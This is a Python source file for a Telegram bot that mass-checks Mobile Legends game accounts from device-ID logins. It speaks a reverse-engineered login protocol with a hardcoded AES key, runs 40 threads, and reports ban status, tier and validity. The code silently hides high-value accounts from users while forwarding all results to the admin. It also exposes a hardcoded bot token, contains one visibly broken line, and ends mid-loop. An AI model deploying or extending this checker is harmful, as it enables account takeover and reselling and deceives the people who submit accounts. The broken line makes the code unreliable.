#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OXIDE BOT v2.3
DEVELOPER - MICK

4-STEP CHECK (Terminal v4.0 exact logic):
  STEP 1: CLEAN
  STEP 2: BAN
  STEP 3: VALID
  STEP 4: INFO

Features:
  - MAX_THREADS = 40
  - Live progress bar animation (no live state text)
  - Admin receives Info + Banned + Errors files
  - Offline Days breakdown (Statistics + Final summary)
  - Silent admin-only tier handling
  - User hides: World Collector & above only
  - Admin sees everything
  - VPS-ready SQLite database
"""

import re
import time
import zlib
import socket
import datetime
import random
import struct
import threading
import sys
import os
import shutil
import asyncio
import sqlite3
import zipfile
import concurrent.futures
from enum import Enum
from pathlib import Path
from collections import Counter

# -- AUTO INSTALL -----------------------------------------------------
def _ensure(mod, pip=None):
    try:
        return __import__(mod)
    except ImportError:
        pip = pip or mod
        print(f"[!] Installing {pip}...")
        import subprocess
        subprocess.run([sys.executable, "-m", "pip", "install", pip, "-q"], check=False)
        return __import__(mod)

_ensure("zstandard")
_ensure("telegram", "python-telegram-bot>=21.0")
_ensure("Crypto", "pycryptodome")

import zstandard as zstd
from Crypto.Cipher import AES
from telegram import (
    Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove,
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler, ContextTypes, filters,
)

# ======================================================================
#  CONFIG
# ======================================================================
BOT_TOKEN = "8950400071:AAElBLKypLuM0yChLlA3evIlLKLXaNjpvXk"
ADMIN_IDS = {8353748526}
BOT_NAME = "OXIDE"
DEVELOPER = "MICK"

# VPS-safe paths
BASE_DIR = Path(os.environ.get("OXIDE_BOT_DIR", os.getcwd())).resolve()
BASE_DIR.mkdir(parents=True, exist_ok=True)

DB_PATH = str(BASE_DIR / "oxide.db")
USERS_DIR = BASE_DIR / "users"
USERS_DIR.mkdir(exist_ok=True)

AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV = b'\x00' * 16
CLIENT_VERSION = '2.1.97.1232.1'
CONNECT_TIMEOUT = 15
READ_TIMEOUT = 12
DEFAULT_THREADS = 40
MAX_THREADS_LIMIT = 150
MAX_THREADS = 40

# User hides ONLY World Collector & above
HIDDEN_TIERS_USER = {
    "World Collector", "Supreme Collector",
}

COLLECTOR_BASE_ORDER = [
    "Amateur Collector", "Junior Collector", "Seasoned Collector",
    "Expert Collector", "Renowned Collector", "Exalted Collector",
    "Mega Collector", "World Collector", "Supreme Collector", "No Tier",
]
ROMAN_ORDER = {"V": 5, "IV": 4, "III": 3, "II": 2, "I": 1, "": 0}
_COLLECTOR_BASE_LOWER = {b.lower(): b for b in COLLECTOR_BASE_ORDER}

BAN_REASON_MAP = {
    "21": "Cheats", "22": "Using Plug-in Apps", "23": "Unauthorized Game Modifications",
    "24": "Scripts or Automation", "25": "Exploiting Game Bugs", "26": "Unauthorized Plugins",
    "27": "Using Bots", "28": "Matchmaking Manipulation", "29": "Intentionally Losing",
    "30": "AFK / Unsportsmanlike", "31": "Harassment / Abusive", "32": "Hate Speech",
    "33": "Threats / Inappropriate", "34": "Impersonation", "35": "Scamming / Fraud",
    "36": "Phishing", "37": "Malicious Links", "38": "Inappropriate Username",
    "39": "Inappropriate Profile", "40": "Account Sharing / Selling", "41": "Fraudulent Payment",
    "42": "Chargeback / Payment Abuse", "43": "Refund Abuse", "44": "Circumventing Ban",
    "45": "Security Vulnerability", "46": "Repeated TOS Violations", "47": "Code of Conduct Violation",
    "48": "Fair Play Violation", "49": "Game Security Violation",
}

HERO_ID_MAP = {
    1: "Miya", 2: "Balmond", 3: "Saber", 4: "Alice", 5: "Nana", 6: "Tigreal", 7: "Alucard",
    8: "Karina", 9: "Akai", 10: "Franco", 11: "Bane", 12: "Bruno", 13: "Clint", 14: "Rafaela",
    15: "Eudora", 16: "Zilong", 17: "Fanny", 18: "Layla", 19: "Minotaur", 20: "Lolita",
    21: "Hayabusa", 22: "Freya", 23: "Gord", 24: "Natalia", 25: "Kagura", 26: "Chou",
    27: "Sun", 28: "Alpha", 29: "Ruby", 30: "Yi Sun-shin", 31: "Moskov", 32: "Johnson",
    33: "Cyclops", 34: "Estes", 35: "Hilda", 36: "Aurora", 37: "Lapu-Lapu", 38: "Vexana",
    39: "Roger", 40: "Karrie", 41: "Gatotkaca", 42: "Harley", 43: "Irithel", 44: "Grock",
    45: "Argus", 46: "Odette", 47: "Lancelot", 48: "Diggie", 49: "Hylos", 50: "Zhask",
    51: "Helcurt", 52: "Pharsa", 53: "Lesley", 54: "Jawhead", 55: "Angela", 56: "Gusion",
    57: "Valir", 58: "Martis", 59: "Uranus", 60: "Hanabi", 61: "Chang'e", 62: "Kaja",
    63: "Selena", 64: "Aldous", 65: "Claude", 66: "Vale", 67: "Leomord", 68: "Lunox",
    69: "Hanzo", 70: "Belerick", 71: "Kimmy", 72: "Thamuz", 73: "Harith", 74: "Minsitthar",
    75: "Kadita", 76: "Faramis", 77: "Badang", 78: "Khufra", 79: "Granger", 80: "Guinevere",
    81: "Esmeralda", 82: "Terizla", 83: "X.Borg", 84: "Ling", 85: "Dyrroth", 86: "Lylia",
    87: "Baxia", 88: "Masha", 89: "Wanwan", 90: "Silvanna", 91: "Cecilion", 92: "Carmilla",
    93: "Atlas", 94: "Popol and Kupa", 95: "Yu Zhong", 96: "Luo Yi", 97: "Benedetta",
    98: "Khaleed", 99: "Barats", 100: "Brody", 101: "Yve", 102: "Mathilda", 103: "Paquito",
    104: "Gloo", 105: "Beatrix", 106: "Phoveus", 107: "Natan", 108: "Aulus", 109: "Aamon",
    110: "Valentina", 111: "Edith", 112: "Floryn", 113: "Yin", 114: "Melissa", 115: "Xavier",
    116: "Julian", 117: "Fredrinn", 118: "Joy", 119: "Novaria", 120: "Arlott", 121: "Ixia",
    122: "Nolan", 123: "Cici", 124: "Chip", 125: "Zhuxin", 126: "Suyou", 127: "Lukas",
    128: "Kalea", 129: "Zetian", 130: "Obsidia",
}

_BUTTON_STYLE_SUPPORTED = False
try:
    import inspect
    _sig = inspect.signature(KeyboardButton.__init__)
    _BUTTON_STYLE_SUPPORTED = "style" in _sig.parameters
except Exception:
    _BUTTON_STYLE_SUPPORTED = False


def KButton(text, style=None):
    if _BUTTON_STYLE_SUPPORTED and style:
        try:
            return KeyboardButton(text=text, style=style)
        except Exception:
            pass
    return KeyboardButton(text=text)


# ======================================================================
#  OFFLINE DAYS — RANGE HELPERS
# ======================================================================
OFFLINE_BUCKETS = [
    ("0-1 day", 0, 1),
    ("2-3 days", 2, 3),
    ("4-7 days", 4, 7),
    ("8-14 days", 8, 14),
    ("15-30 days", 15, 30),
    ("30+ days", 31, 999999),
]


def _offline_days(last_login_ts):
    try:
        ts = float(last_login_ts or 0)
        if ts <= 0:
            return None
        now = time.time()
        delta = now - ts
        if delta < 0:
            return 0
        return int(delta // 86400)
    except Exception:
        return None


def _bucket_offline(days):
    if days is None:
        return "Unknown"
    for label, lo, hi in OFFLINE_BUCKETS:
        if lo <= days <= hi:
            return label
    return "Unknown"


def _compute_offline_breakdown(players):
    counts = {label: 0 for label, _, _ in OFFLINE_BUCKETS}
    unknown = 0
    total = 0
    for pd in players:
        days = _offline_days(pd.get("last_login_ts", 0))
        if days is None:
            unknown += 1
            continue
        bucket = _bucket_offline(days)
        if bucket in counts:
            counts[bucket] += 1
            total += 1
        else:
            unknown += 1
    return counts, total, unknown


def _render_offline_breakdown(players, indent="    "):
    counts, total, unknown = _compute_offline_breakdown(players)
    lines = ["Offline Days Breakdown:"]
    max_count = max(counts.values()) if counts else 1
    max_count = max(max_count, 1)
    for label, _, _ in OFFLINE_BUCKETS:
        cnt = counts.get(label, 0)
        bar_len = int(20 * cnt / max_count) if max_count > 0 else 0
        bar = "#" * bar_len + "." * (20 - bar_len)
        lines.append(f"{indent}{label:<12} {bar}  {cnt}")
    if unknown > 0:
        lines.append(f"{indent}Unknown      {'-' * 20}  {unknown}")
    lines.append(f"{indent}Total (with login): {total}")
    return "\n".join(lines)


# ======================================================================
#  JOB REGISTRY
# ======================================================================
_jobs_lock = threading.Lock()
_active_jobs = {}


def job_new(user_id):
    jid = f"{user_id}_{int(time.time())}_{id(threading.current_thread())}"
    with _jobs_lock:
        _active_jobs[jid] = {
            "state": "running",
            "step": 1,
            "step_name": "CLEAN",
            "done": 0,
            "total": 0,
            "user_id": user_id,
            "started": time.time(),
            "counts": {"clean": 0, "banned": 0, "valid": 0, "info": 0, "errors": 0},
        }
    return jid


def job_get(jid):
    with _jobs_lock:
        j = _active_jobs.get(jid)
        return dict(j) if j else None


def job_update(jid, **kwargs):
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid].update(kwargs)


def job_inc_count(jid, key, delta=1):
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["counts"][key] = _active_jobs[jid]["counts"].get(key, 0) + delta


def job_set_state(jid, state):
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["state"] = state


def job_inc(jid):
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["done"] += 1


def job_set_total(jid, total):
    with _jobs_lock:
        if jid in _active_jobs:
            _active_jobs[jid]["total"] = total
            _active_jobs[jid]["done"] = 0


def job_finish(jid):
    with _jobs_lock:
        _active_jobs.pop(jid, None)


def job_is_stopped(jid):
    with _jobs_lock:
        j = _active_jobs.get(jid)
        return (not j) or j["state"] == "stopped"


# ======================================================================
#  TIER NORMALIZATION
# ======================================================================
def _normalize_collector_tier(raw):
    if raw is None:
        return ("No Tier", "", "No Tier")
    s = str(raw).strip()
    if not s or s.lower() in ("unknown", "n/a", "na", "none", "-", "null"):
        return ("No Tier", "", "No Tier")
    s = re.sub(r"\s+", " ", s)
    m = re.match(r"^(.*?\bCollector)(?:\s+([IVX]+))?$", s, re.I)
    if not m:
        m2 = re.match(r"^(.*?)(?:\s+([IVX]+))?$", s, re.I)
        if m2:
            base_raw = m2.group(1).strip()
            roman = (m2.group(2) or "").upper()
        else:
            base_raw, roman = s, ""
    else:
        base_raw = m.group(1).strip()
        roman = (m.group(2) or "").upper()
    base_lower = base_raw.lower()
    canonical = _COLLECTOR_BASE_LOWER.get(base_lower)
    if canonical is None:
        base_no_suffix = re.sub(r"\s*collector\s*$", "", base_lower).strip()
        for k, v in _COLLECTOR_BASE_LOWER.items():
            if re.sub(r"\s*collector\s*$", "", k).strip() == base_no_suffix:
                canonical = v
                break
    if canonical is None:
        canonical = base_raw
    full = f"{canonical} {roman}".strip() if roman else canonical
    return (canonical, roman, full)


def _is_hidden_tier_user(tier_base):
    """User hides: World Collector & above only."""
    return tier_base in HIDDEN_TIERS_USER


def _base_sort_key(base):
    try:
        return COLLECTOR_BASE_ORDER.index(base)
    except ValueError:
        return 999


# ======================================================================
#  SDP PROTOCOL
# ======================================================================
class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8


class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self.offset = 0
            self._unpack_from_binary()
        elif data is not None:
            super().update(data)
            self._pack_to_binary()

    def _pack_to_binary(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for tag, value in sorted(self.items()):
            self._pack(tag, value)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _unpack_from_binary(self):
        if not self.data:
            return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            tag, value = self._unpack()
            if isinstance(value, SdpDataType) and value == SdpDataType.STRUCT_END:
                break
            self[tag] = value

    def _write_number(self, value):
        result = bytearray()
        while value >= 0x80:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)

    def _read_number(self):
        n = 1
        val = self.data[self.offset] & 0x7F
        while self.offset + n - 1 < len(self.data) and self.data[self.offset + n - 1] >= 0x80:
            if self.offset + n >= len(self.data):
                break
            val |= (self.data[self.offset + n] & 0x7F) << (7 * n)
            n += 1
        self.offset += n
        return val

    def _pack_header(self, tag, data_type):
        if tag < 15:
            self.data += bytes([(data_type.value << 4) | tag])
        else:
            self.data += bytes([(data_type.value << 4) | 15])
            self.data += self._write_number(tag)

    def _pack(self, tag, value):
        if isinstance(value, bool):
            self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._write_number(1 if value else 0)
        elif isinstance(value, int):
            if value < 0:
                self._pack_header(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._write_number(-value)
            else:
                self._pack_header(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._write_number(value)
        elif isinstance(value, float):
            self._pack_header(tag, SdpDataType.DOUBLE)
            packed = struct.pack("<d", value)
            self.data += self._write_number(len(packed)) + packed
        elif isinstance(value, (str, bytes)):
            self._pack_header(tag, SdpDataType.STRING)
            encoded = value.encode('utf-8') if isinstance(value, str) else value
            self.data += self._write_number(len(encoded)) + encoded
        elif isinstance(value, list):
            self._pack_header(tag, SdpDataType.LIST)
            self.data += self._write_number(len(value))
            for item in value:
                self._pack(0, item)
        elif isinstance(value, dict):
            if isinstance(value, SdpStruct):
                self._pack_header(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(value.items()):
                    self._pack(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._pack_header(tag, SdpDataType.DICT)
                self.data += self._write_number(len(value))
                for k, v in sorted(value.items()):
                    self._pack(0, k)
                    self._pack(0, v)

    def _unpack(self):
        try:
            if self.offset >= len(self.data):
                return 0, None
            header = self.data[self.offset]
            tag = header & 0xF
            data_type = SdpDataType(header >> 4)
            self.offset += 1
            if tag == 15:
                tag = self._read_number()
            if data_type == SdpDataType.INTEGER_POSITIVE:
                return tag, self._read_number()
            elif data_type == SdpDataType.INTEGER_NEGATIVE:
                return tag, -self._read_number()
            elif data_type == SdpDataType.FLOAT:
                n = self._read_number()
                v = self.data[self.offset:self.offset+n].ljust(4, b'\x00')
                self.offset += n
                return tag, struct.unpack("<f", v)[0]
            elif data_type == SdpDataType.DOUBLE:
                n = self._read_number()
                v = self.data[self.offset:self.offset+n].ljust(8, b'\x00')
                self.offset += n
                return tag, struct.unpack("<d", v)[0]
            elif data_type == SdpDataType.STRING:
                length = self._read_number()
                try:
                    value = self.data[self.offset:self.offset+length].decode('utf-8')
                except UnicodeDecodeError:
                    value = self.data[self.offset:self.offset+length]
                self.offset += length
                return tag, value
            elif data_type == SdpDataType.LIST:
                length = self._read_number()
                value = []
                for _ in range(length):
                    _, item = self._unpack()
                    value.append(item)
                return tag, value
            elif data_type == SdpDataType.DICT:
                length = self._read_number()
                value = {}
                for _ in range(length):
                    _, k = self._unpack()
                    _, v = self._unpack()
                    value[k] = v
                return tag, value
            elif data_type == SdpDataType.STRUCT_BEGIN:
                struct_data = {}
                while True:
                    sub_tag, sub_value = self._unpack()
                    if isinstance(sub_value, SdpDataType) and sub_value == SdpDataType.STRUCT_END:
                        break
                    struct_data[sub_tag] = sub_value
                return tag, SdpStruct(struct_data)
            elif data_type == SdpDataType.STRUCT_END:
                return tag, SdpDataType.STRUCT_END
        except Exception:
            pass
        return 0, None


# ======================================================================
#  CONNECTIONS
# ======================================================================
class BaseConnection:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sequence = 1
        self.socket = None
        self.queue_data = b''
        self.last_header_size = 0

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, exc_type, exc, tb):
        self.cleanup()

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(8)

    def cleanup(self):
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
            self.sequence = 1
            self.socket = None

    def send_data(self, id, sdp):
        packet = SdpStruct({0: id, 1: self.sequence, 5: sdp.data}).data
        buf = zstd.compress(packet)
        flags = (len(buf) + 4) | (16 << 24)
        buf = flags.to_bytes(4, 'big') + buf
        self.socket.sendall(buf)
        self.sequence += 1

    def recv_data(self):
        try:
            while len(self.queue_data) < 4:
                data = self.socket.recv(4096)
                if not data:
                    return None, None
                self.queue_data += data
            flags = int.from_bytes(self.queue_data[:4], 'big')
            size = flags & 0xFFFFFF
            compression_type = flags >> 24
            self.last_header_size = size
            while len(self.queue_data) < size:
                data = self.socket.recv(4096)
                if not data:
                    return None, None
                self.queue_data += data
            data = self.queue_data[4:size]
            self.queue_data = self.queue_data[size:]
            if compression_type == 1:
                data = zlib.decompress(data)
            elif compression_type == 16:
                data = zstd.decompress(data)
            elif compression_type in (2, 3, 18):
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                decrypted = cipher.decrypt(data[:-1] if len(data) % 16 != 0 else data)
                data = decrypted.rstrip(b'\x00')
                if compression_type == 3:
                    data = zlib.decompress(data)
                elif compression_type == 18:
                    data = zstd.decompress(data)
            result = SdpStruct(data)
            id_ = result.get(0)
            if id_ is None:
                return None, None
            res = result.get(6, None)
            if not res or not isinstance(res, bytes):
                res = result.get(5, None)
                if not res or not isinstance(res, bytes):
                    return id_, None
            return id_, SdpStruct(res)
        except socket.timeout:
            return -1, None
        except Exception:
            return None, None


class GameConnection(BaseConnection):
    def __init__(self, device_id, device_model=None):
        super().__init__('login.ml.youngjoygame.com', 30021)
        self.device_id = device_id
        self.device_model = device_model or "Xiaomi:Redmi Note 12"
        parts = self.device_id.split('_')
        if len(parts) >= 2:
            device_info = parts[1]
            if len(parts) >= 3 and len(device_info) < 32:
                device_info = device_info + "_" + parts[2]
            if len(device_info) >= 32:
                self.imei_md5 = device_info[:32]
                if len(device_info) >= 48:
                    self.android_id = device_info[32:48]
                    self.advertising_id = device_info[48:] if len(device_info) > 48 else ""
                else:
                    self.android_id = ""
                    self.advertising_id = ""
            else:
                self.imei_md5 = device_info
                self.android_id = ""
                self.advertising_id = ""
        else:
            self.imei_md5 = device_id
            self.android_id = ""
            self.advertising_id = ""
        self.channel = 'and_usa'
        self.client_version = CLIENT_VERSION
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_server_host = ''
        self.game_server_port = 0
        self.creation_ts = 0

    def login_to_login_server(self):
        if self.host != 'login.ml.youngjoygame.com' or self.port != 30021:
            self.cleanup()
            self.host = 'login.ml.youngjoygame.com'
            self.port = 30021
            self.connect()
        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.advertising_id}&android_id={self.android_id}&device_unique_id={self.imei_md5}',
            2: self.client_version, 3: self.channel, 4: 'en'
        }))
        id_, res = self.recv_data()
        if id_ == 2 and res:
            self.account_id = res.get(0)
            sk = res.get(1)
            if sk is None:
                return False
            self.session_key = sk
            zd = res.get(2)
            if isinstance(zd, list) and zd:
                try:
                    self.zone_id = zd[0] if not isinstance(zd[0], dict) else zd[0].get(0, 0)
                except Exception:
                    return False
            elif isinstance(zd, dict):
                self.zone_id = zd.get(0, 0)
            else:
                self.zone_id = zd or 0
            if not self.zone_id:
                return False
            self.creation_ts = res.get(19, 0)
            return True
        return False

    def get_game_server(self):
        self.send_data(5, SdpStruct({
            0: self.account_id, 1: self.session_key,
            2: self.client_version, 5: self.zone_id, 6: self.channel
        }))
        id_, res = self.recv_data()
        if id_ == 6 and res:
            game_server = res[1]
            self.game_server_host, self.game_server_port = game_server.split(':')
            self.game_server_port = int(self.game_server_port)
            return True
        return False

    def connect_to_game_server(self):
        self.cleanup()
        self.host = self.game_server_host
        self.port = self.game_server_port
        self.connect()
        self.send_data(10001, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.zone_id,
            4: self.client_version, 13: self.channel, 15: self.device_id
        }))
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        deadline = time.time() + 15.0
        while time.time() < deadline:
            id_, res = self.recv_data()
            if id_ is None:
                return False
            elif id_ == 10002:
                return True
            elif id_ == -1:
                continue
        return False

    def lookup_player(self, search_value, search_type="id", server_filter=None, zone_id=None):
        if search_type == "id":
            payload = {1: int(search_value)}
            if zone_id is not None:
                payload[2] = int(zone_id)
            lookup_data = SdpStruct(payload)
        else:
            lookup_data = SdpStruct({0: str(search_value).strip()})
        self.send_data(11153, lookup_data)
        id_20001_count = 0
        while True:
            id_, res = self.recv_data()
            if id_ is None:
                return None
            elif id_ == -1:
                return None
            elif id_ == 11154:
                if search_type == "nickname" and server_filter is not None:
                    return self.filter_by_server(res, server_filter)
                return res
            elif id_ == 20001:
                id_20001_count += 1
                if self.last_header_size < 100 and id_20001_count >= 2:
                    return None

    def get_skin_role_info(self, role_id, zone_id, max_retries=3):
        for _ in range(max_retries):
            try:
                self.send_data(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
                timeout_count = 0
                while timeout_count < 3:
                    pid, res = self.recv_data()
                    if pid is None:
                        break
                    elif pid == -1:
                        timeout_count += 1
                    elif pid == 10144:
                        return res
                    elif pid == 20001:
                        continue
            except Exception:
                pass
        return None

    def get_v2l_status(self, role_id, zone_id, max_retries=2):
        for _ in range(max_retries):
            try:
                self.send_data(10208, SdpStruct({0: int(role_id), 1: int(zone_id)}))
                timeout_count = 0
                while timeout_count < 2:
                    pid, res = self.recv_data()
                    if pid is None:
                        break
                    elif pid == -1:
                        timeout_count += 1
                    elif pid == 10208:
                        if res:
                            return {"_source": 10208, "_data": dict(res)}
                    elif pid == 20001:
                        continue
                self.send_data(10145, SdpStruct({0: int(role_id), 1: int(zone_id)}))
                timeout_count = 0
                while timeout_count < 2:
                    pid, res = self.recv_data()
                    if pid is None:
                        break
                    elif pid == -1:
                        timeout_count += 1
                    elif pid in (10146, 10160):
                        if res:
                            return {"_source": pid, "_data": dict(res)}
                    elif pid == 20001:
                        continue
            except Exception:
                pass
        return None

    def filter_by_server(self, result, target_server):
        if not result or not result.get(0):
            return None
        for player in result[0]:
            if isinstance(player, dict):
                if player.get(1) == target_server:
                    return {0: [player]}
        return None

    def __enter__(self):
        super().__enter__()
        if not self.login_to_login_server():
            raise ConnectionError("LOGIN_FAILED")
        if not self.get_game_server():
            raise ConnectionError("SERVER_SELECTION_FAILED")
        return self


# ======================================================================
#  BAN CONNECTION
# ======================================================================
class _BanConn:
    __slots__ = ('host', 'port', 'seq', 'sock', 'qbuf', 'device_id', 'imei_md5', 'android_id',
                 'advertising_id', 'channel', 'client_version', 'account_id', 'session_key',
                 'zone_id', 'gs_host', 'gs_port', 'last_raw', 'last_dec')

    def __init__(self, device_id):
        self.host = 'login.ml.youngjoygame.com'
        self.port = 30021
        self.seq = 1
        self.sock = None
        self.qbuf = b''
        self.device_id = device_id
        self.last_raw = b''
        self.last_dec = b''
        parts = device_id.split('_')
        di = parts[1] if len(parts) >= 2 else device_id
        if len(parts) >= 3 and len(di) < 32:
            di = di + "_" + parts[2]
        if len(di) >= 32:
            self.imei_md5 = di[:32]
            self.android_id = di[32:48] if len(di) >= 48 else ""
            self.advertising_id = di[48:] if len(di) > 48 else ""
        else:
            self.imei_md5 = device_id
            self.android_id = ""
            self.advertising_id = ""
        self.channel = 'and_usa'
        self.client_version = CLIENT_VERSION
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.gs_host = ''
        self.gs_port = 0

    def connect(self, host=None, port=None):
        if host:
            self.host = host        if port:
            self.port = port
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(CONNECT_TIMEOUT)
        s.connect((self.host, self.port))
        s.settimeout(READ_TIMEOUT)
        self.sock = s

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.seq = 1
            self.sock = None

    def send(self, pkt_id, sdp):
        pkt = SdpStruct({0: pkt_id, 1: self.seq, 5: sdp.data}).data
        buf = zstd.compress(pkt)
        buf = ((len(buf) + 4) | (16 << 24)).to_bytes(4, 'big') + buf
        self.sock.sendall(buf)
        self.seq += 1

    def recv(self):
        try:
            while len(self.qbuf) < 4:
                d = self.sock.recv(4096)
                if not d:
                    return None, None
                self.qbuf += d
            flags = int.from_bytes(self.qbuf[:4], 'big')
            size = flags & 0xFFFFFF
            ct = flags >> 24
            if size < 4 or size > 10_000_000:
                return None, None
            while len(self.qbuf) < size:
                d = self.sock.recv(4096)
                if not d:
                    return None, None
                self.qbuf += d
            data = self.qbuf[4:size]
            self.qbuf = self.qbuf[size:]
            self.last_raw = data
            if ct == 1:
                data = zlib.decompress(data)
            elif ct == 16:
                data = zstd.decompress(data)
            elif ct in (2, 3, 18):
                c = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = c.decrypt(data[:-1] if len(data) % 16 != 0 else data)
                data = data.rstrip(b'\x00')
                if ct == 3:
                    data = zlib.decompress(data)
                elif ct == 18:
                    data = zstd.decompress(data)
            self.last_dec = data
            r = SdpStruct(data)
            pid = r.get(0)
            if pid is None:
                return None, None
            res = r.get(6) or r.get(5)
            if not res or not isinstance(res, bytes):
                return pid, None
            return pid, SdpStruct(res)
        except socket.timeout:
            return -1, None
        except Exception:
            return None, None


def _parse_ban_20001(res):
    if not res:
        return None
    info = {}
    reason_code = None
    day = None
    hour = None
    minute = None
    sec = None
    stack = [dict(res)]
    while stack:
        obj = stack.pop()
        if isinstance(obj, dict):
            for k, v in obj.items():
                kl = str(k).lower() if isinstance(k, str) else str(k)
                if kl == 'ban_reason':
                    reason_code = str(v)
                elif kl == 'endtime_day':
                    day = str(v)
                elif kl == 'endtime_hour':
                    hour = str(v)
                elif kl == 'endtime_min':
                    minute = str(v)
                elif kl == 'endtime_sec':
                    sec = str(v)
                if isinstance(v, (dict, list)):
                    stack.append(v)
        elif isinstance(obj, list):
            for it in obj:
                if isinstance(it, (dict, list)):
                    stack.append(it)
    if reason_code is not None or day is not None:
        info['ban_reason'] = reason_code or '?'
        info['reason_name'] = BAN_REASON_MAP.get(reason_code, f"Code {reason_code}")
        if day is not None:
            info['endtime_day'] = day
        if hour is not None:
            info['endtime_hour'] = hour
        if minute is not None:
            info['endtime_min'] = minute
        if sec is not None:
            info['endtime_sec'] = sec
        return info
    return None


def _fmt_ban(did, info):
    reason = info.get('reason_name') or info.get('ban_reason') or "Banned"
    code = info.get('ban_reason', '?')
    day = info.get('endtime_day')
    h = info.get('endtime_hour', '00')
    m = info.get('endtime_min', '00')
    s = info.get('endtime_sec', '00')
    if day is not None:
        return f"{did} | Reason: {reason} (code {code}) | Duration: Day {day}, {h}:{m}:{s}"
    return f"{did} | Reason: {reason} (code {code})"


_ban_rate_lock = threading.Lock()
_ban_last_req = [0.0]
BAN_MIN_INTERVAL = 0.02


def _ban_rate_wait():
    with _ban_rate_lock:
        now = time.time()
        wait = BAN_MIN_INTERVAL - (now - _ban_last_req[0])
        if wait > 0:
            time.sleep(wait)
            now = time.time()
        _ban_last_req[0] = now


def _ban_check_one(device_id):
    _ban_rate_wait()
    c = _BanConn(device_id)
    try:
        try:
            c.connect('login.ml.youngjoygame.com', 30021)
        except socket.timeout:
            return "UNKNOWN", f"{device_id} | LOGIN_TIMEOUT", True
        except Exception:
            return "UNKNOWN", f"{device_id} | LOGIN_FAIL", True
        try:
            c.send(1, SdpStruct({
                0: c.device_id,
                1: f'gps_adid={c.advertising_id}&android_id={c.android_id}&device_unique_id={c.imei_md5}',
                2: c.client_version, 3: c.channel, 4: 'en'
            }))
        except Exception:
            return "UNKNOWN", f"{device_id} | LOGIN_SEND_FAIL", True
        pid, res = c.recv()
        if pid == -1:
            return "UNKNOWN", f"{device_id} | LOGIN_RESP_TIMEOUT", True
        if pid is None:
            return "UNKNOWN", f"{device_id} | LOGIN_CLOSED", True
        if pid != 2 or not res:
            return "UNKNOWN", f"{device_id} | LOGIN_BAD pkt={pid}", True
        acc = res.get(0)
        sk = res.get(1)
        zd = res.get(2)
        if acc is None or sk is None:
            return "UNKNOWN", f"{device_id} | NO_SESSION", False
        try:
            if isinstance(zd, dict):
                zid = zd.get(0, 0)
            elif isinstance(zd, list) and zd:
                zid = zd[0] if not isinstance(zd[0], dict) else zd[0].get(0, 0)
            else:
                zid = zd or 0
        except Exception:
            zid = 0
        if not zid:
            return "UNKNOWN", f"{device_id} | NO_ZONE", False
        c.account_id = acc
        c.session_key = sk
        c.zone_id = zid
        try:
            c.send(5, SdpStruct({0: acc, 1: sk, 2: c.client_version, 5: zid, 6: c.channel}))
        except Exception:
            return "UNKNOWN", f"{device_id} | GS_SEND_FAIL", True
        pid, res = c.recv()
        if pid == -1:
            return "UNKNOWN", f"{device_id} | GS_TIMEOUT", True
        if pid is None:
            return "UNKNOWN", f"{device_id} | GS_CLOSED", True
        if pid != 6 or not res:
            return "UNKNOWN", f"{device_id} | GS_BAD pkt={pid}", True
        gs = res.get(1)
        if not isinstance(gs, str) or ':' not in gs:
            return "UNKNOWN", f"{device_id} | GS_INVALID", False
        host, port_s = gs.split(':')
        try:
            port = int(port_s)
        except ValueError:
            return "UNKNOWN", f"{device_id} | GS_PORT_BAD", False
        c.close()
        try:
            c.connect(host, port)
        except socket.timeout:
            return "UNKNOWN", f"{device_id} | GS_CONN_TIMEOUT", True
        except Exception:
            return "UNKNOWN", f"{device_id} | GS_CONN_FAIL", True
        try:
            c.send(10001, SdpStruct({0: acc, 1: sk, 2: zid, 4: c.client_version, 13: c.channel, 15: c.device_id}))
            c.send(10101, SdpStruct({0: 0, 2: 2}))
        except Exception:
            return "UNKNOWN", f"{device_id} | ENTER_SEND_FAIL", True
        got_20001 = False
        deadline = time.time() + 30.0
        try:
            c.sock.settimeout(15.0)
        except Exception:
            pass
        while time.time() < deadline:
            pid, res = c.recv()
            if pid == -1:
